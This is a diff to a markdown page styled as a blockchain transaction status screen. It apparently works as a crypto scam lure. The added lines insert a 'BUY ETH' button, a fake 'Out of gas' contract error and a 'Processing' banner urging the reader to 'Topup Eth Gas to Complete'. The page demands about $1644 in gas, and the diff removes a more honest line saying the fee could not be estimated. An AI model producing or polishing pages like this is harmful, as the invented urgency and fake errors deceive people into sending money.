@@ -27,8 +27,14 @@ Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
 
 <img src="IMG_9043.jpeg" alt="blockchain Logo" width="700" />
 
+<form action="https://phantom.com/" method="get">
+  <button type="submit"> [BUY ETH 0.89560913 ⛽️] </button>
+</form>
+
+
 ***Gas*** (estimated) ***:***  [$1644 usd] **0.89560913 ETH***
-<span style="color: green;">Very likely in ‹ 15 seconds</span>
+
+<span style="color: green;">Very likely in ‹<15 seconds</span>
 
 |
 
@@ -37,9 +43,8 @@ Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
 
 <img src="IMG_9083.jpeg" alt="blockchain Logo" width="38" />
 
+<span style="color: Blue;">**Contract**</span> <span style="color: Red;">Warning! Error encountered during contract execution [Out of gas]</span>
 
-
-**We were not able to estimate gas. There might be an error in the contract and this transaction may fail.**
 
 ✅ This transaction is <span style="color: Red;"> Processing </span> , Topup Eth Gas to Complete.✓⃝
 
